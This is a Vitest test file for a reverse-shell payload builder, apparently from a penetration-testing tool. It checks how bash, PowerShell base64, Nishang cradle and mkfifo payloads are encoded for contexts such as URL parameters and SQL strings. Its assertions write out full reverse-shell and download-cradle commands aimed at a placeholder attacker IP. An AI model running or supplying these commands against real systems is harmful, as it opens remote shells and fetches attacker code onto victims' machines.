import { describe, expect, it } from "vitest";
import { buildPayload } from "../../../engines/payloads/build";
import { decodeUtf16leBase64 } from "../../../engines/payloads/encode";
import { REVERSE_SHELLS } from "../../../engines/payloads/reverseShells";

const V = { LHOST: "192.0.2.10", LPORT: "443" };
const def = (id: string) => {
  const d = REVERSE_SHELLS.find((x) => x.id === id);
  if (!d) throw new Error(id);
  return d;
};

describe("REVERSE_SHELLS", () => {
  it("every def has parts covering each flag in its template", () => {
    for (const d of REVERSE_SHELLS) {
      expect(d.parts.length).toBeGreaterThan(0);
      for (const p of d.parts) expect(p.token && p.explain).toBeTruthy();
      for (const ctx of d.contexts) {
        const { text } = buildPayload(d, ctx, V);
        const flags = text.match(/(?<=^|[\s+])--?[A-Za-z][\w]*/g) ?? [];
        for (const f of flags) {
          expect(d.parts.some((p) => p.token.includes(f)), `${d.id}/${ctx}: ${f}`).toBe(true);
        }
      }
    }
  });

  it("bash-tcp in injected-linux is bash -c wrapped", () => {
    expect(buildPayload(def("bash-tcp"), "injected-linux", V).text).toBe("bash -c 'bash -i >& /dev/tcp/192.0.2.10/443 0>&1'");
  });

  it("no Linux def uses nc -e", () => {
    for (const d of REVERSE_SHELLS.filter((x) => x.os === "linux")) expect(d.template).not.toMatch(/\bnc\b.* -e\b/);
  });

  it("ps-b64 decodes to a TCPClient script with the given LHOST and LPORT", () => {
    const { text } = buildPayload(def("ps-b64"), "cmd", V);
    const m = text.match(/^powershell -nop -w hidden -e (\S+)$/);
    expect(m).not.toBeNull();
    const script = decodeUtf16leBase64(m![1]);
    expect(script).toContain("TCPClient");
    expect(script).toContain('("192.0.2.10",443)');
  });

  it("ps-b64 in url-param is URL-encoded so base64 survives", () => {
    const { text } = buildPayload(def("ps-b64"), "url-param", V);
    expect(text).toMatch(/^powershell\+-nop\+-w\+hidden\+-e\+/);
    expect(text).not.toMatch(/[=/]/);
  });

  it("nishang-cradle in sql-string has doubled quotes", () => {
    const b = buildPayload(def("nishang-cradle"), "sql-string", V);
    expect(b.text).toContain("DownloadString(''http://192.0.2.10/rev.ps1'')");
    expect(def("nishang-cradle").bakesIp).toBe(true);
    expect(def("powercat-cradle").bakesIp).toBeFalsy();
  });

  it("nc-exe carries the no -e note", () => {
    expect(buildPayload(def("nc-exe"), "cmd", V).notes.join(" ")).toContain("if it returns instantly, the build has no -e");
  });

  it("listener is penelope -O -p 443 for LPORT 443", () => {
    expect(buildPayload(def("bash-tcp"), "bash-prompt", V).listener).toBe("penelope -O -p 443");
  });

  it("unresolved lists LHOST when it is blank", () => {
    const b = buildPayload(def("bash-tcp"), "bash-prompt", { LHOST: " ", LPORT: "443" });
    expect(b.unresolved).toEqual(["LHOST"]);
    expect(b.text).toContain("{LHOST}");
    const e = buildPayload(def("ps-b64"), "cmd", { LPORT: "443" });
    expect(e.unresolved).toEqual(["LHOST"]);
    expect(e.text).toContain("{LHOST}");
  });

  it("backgrounded mkfifo ends with ) &", () => {
    expect(buildPayload(def("mkfifo-nc-bg"), "bash-prompt", V).text).toMatch(/^\(rm -f.*\) &$/);
  });
});
